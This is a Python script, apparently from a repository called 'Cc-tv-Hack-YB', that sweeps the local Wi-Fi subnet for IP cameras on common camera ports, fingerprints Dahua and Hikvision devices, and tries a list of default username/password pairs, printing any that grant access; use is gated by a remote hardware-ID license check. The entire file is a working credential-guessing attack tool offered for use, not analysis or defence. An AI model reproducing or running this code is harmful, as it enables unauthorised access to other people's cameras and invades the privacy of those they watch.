#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Arman Local Wi-Fi Camera Scanner & Terminal Analyzer (Pro)
Author: Arman Yb
GitHub: github.com/Armanyb1
Telegram: @Armanyb
"""

import socket
import requests
from requests.auth import HTTPBasicAuth
import threading
from queue import Queue
import ipaddress
from datetime import datetime
import time
import sys
import os
import platform
import uuid

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[91m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
    class Style:
        RESET_ALL = '\033[0m'

REMOTE_LICENSE_URL = "https://raw.githubusercontent.com/Armanyb1/Cc-tv-Hack-YB/refs/heads/main/keys.txt"

socket.setdefaulttimeout(0.3)
detected_ips = set()
stop_scan = False
scan_results = []

def get_hwid():
    device_id_path = "/data/data/com.termux/files/home/.device_id"
    try:
        if os.path.exists(device_id_path):
            with open(device_id_path, "r") as f:
                return f.read().strip()
        else:
            short_id = str(uuid.uuid4()).split('-')[0].upper()
            hwid = f"ARMAN-{short_id}"
            with open(device_id_path, "w") as f:
                f.write(hwid)
            return hwid
    except:
        return "ARMAN-PRO-ID"

def verify_online_license():
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Verifying Online License...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    current_hwid = get_hwid()
    try:
        url_with_cache_buster = f"{REMOTE_LICENSE_URL}?t={int(time.time())}"
        response = requests.get(url_with_cache_buster, timeout=10)
        if response.status_code != 200:
            print(f"{Fore.RED}[❌] Connection Error to License Server.{Style.RESET_ALL}")
            sys.exit(1)
            
        license_data = response.text.strip().splitlines()
        authorized = False
        
        for line in license_data:
            if not line or line.startswith('#'): continue
            parts = line.strip().split('|')
            if len(parts) >= 2:
                if parts[0].strip().upper() == current_hwid:
                    if parts[1].strip().upper() in ["LIFETIME", "BLOCKED"]:
                        if parts[1].strip().upper() == "BLOCKED":
                            print(f"{Fore.RED}[❌] Access Blocked by Admin!{Style.RESET_ALL}")
                            sys.exit(1)
                        authorized = True
                        break
                    else:
                        try:
                            if datetime.now() <= datetime.strptime(parts[1].strip().upper(), "%Y-%m-%d"):
                                authorized = True
                                break
                        except:
                            pass
                            
        if authorized:
            print(f"{Fore.GREEN}[✓] Access Granted! Status: Active{Style.RESET_ALL}")
            time.sleep(1)
            return True
        else:
            print(f"{Fore.RED}[❌] Access Denied: HWID not registered!{Style.RESET_ALL}")
            sys.exit(1)
    except:
        print(f"{Fore.RED}[❌] Network Error.{Style.RESET_ALL}")
        sys.exit(1)

def print_banner():
    banner = f"""
╔═══════════════════════════════════════════╗
║   Arman Local Wi-Fi Terminal Scanner      ║
║   Local LAN Recon & Direct Display Tool   ║
║   Telegram: @Armanyb                      ║
╚═══════════════════════════════════════════╝
"""
    print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Developer: {Fore.YELLOW}Arman Yb{Style.RESET_ALL}\n")

def get_local_ip_subnet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        subnet = ".".join(local_ip.split(".")[:3]) + "."
        return local_ip, subnet
    except:
        return "192.168.1.100", "192.168.1."

def check_default_credentials(url):
    common_credentials = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "1234"),
        ("root", "root"),
        ("admin", "")
    ]
    
    for username, password in common_credentials:
        try:
            res = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=1.5)
            if res.status_code == 200:
                if "login" not in res.text.lower() and "unauthorized" not in res.text.lower():
                    return f"{username}:{password}"
        except:
            pass
    return "Protected / Unknown"

def scan(ip, port):
    global stop_scan
    if stop_scan: return
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))
            sock.send(b'GET / HTTP/1.1\r\nHost: local\r\n\r\n')
            response = sock.recv(4096).decode()
            url = f"http://{ip}:{port}" if port != 80 else f"http://{ip}"
            
            camera_found = False
            cam_type = "Unknown Camera"
            
            if '<title>WEB SERVICE</title>' in response or 'Dahua' in response:
                camera_found = True
                cam_type = "Dahua Camera"
            elif 'login.asp' in response or 'Hikvision' in response:
                camera_found = True
                cam_type = "Hikvision Camera"
            elif 'login' in response.lower() or 'camera' in response.lower() or port in [554, 8000, 37777]:
                camera_found = True
                cam_type = "Generic IP Camera/Device"
                
            if camera_found and ip not in detected_ips:
                detected_ips.add(ip)
                creds = check_default_credentials(url)
                
                result_item = {
                    "ip": ip,
                    "port": port,
                    "type": cam_type,
                    "url": url,
                    "creds": creds
                }
                scan_results.append(result_item)
                
                print(f"\n{Fore.GREEN}[✓] Found: {cam_type} | IP: {ip}:{port} | Creds: {creds}{Style.RESET_ALL}")
    except:
        pass

def execute(queue):
    global stop_scan
    while not stop_scan:
        try:
            ip, port = queue.get(timeout=0.5)
            scan(ip, port)
            queue.task_done()
        except:
            if stop_scan: break

def run_local_scanner():
    global stop_scan, scan_results
    stop_scan = False
    scan_results = []
    detected_ips.clear()
    
    local_ip, subnet = get_local_ip_subnet()
    print(f"{Fore.YELLOW}[i] Your Local IP: {local_ip}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Scanning Local Subnet: {subnet}1 to {subnet}254 for Cameras...{Style.RESET_ALL}\n")
    
    queue = Queue()
    for _ in range(50):
        threading.Thread(target=execute, args=(queue,), daemon=True).start()
        
    ports_to_check = [80, 8080, 554, 8000, 37777]
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        for port in ports_to_check:
            queue.put((ip, port))
            
    while not queue.empty() and not stop_scan:
        time.sleep(0.5)
        
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}             SCAN SUMMARY & DISCOVERED DEVICES             {Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    if scan_results:
        for idx, res in enumerate(scan_results, 1):
            print(f"{Fore.WHITE}[{idx}] Brand : {res['type']}")
            print(f"    IP & Port : {res['ip']}:{res['port']}")
            print(f"    URL       : {res['url']}")
            print(f"    Auth/Pass : {res['creds']}")
            print(f"{'-'*60}")
    else:
        print(f"{Fore.RED}[!] No cameras or devices found on this Wi-Fi network.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

def main():
    verify_online_license()
    print_banner()
    while True:
        print(f"\n{Fore.CYAN}1. Scan Current Wi-Fi & List Devices\n2. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.GREEN}Select option (1-2): {Style.RESET_ALL}").strip()
        if choice == '1':
            run_local_scanner()
        elif choice == '2':
            break

if __name__ == "__main__":
    main()
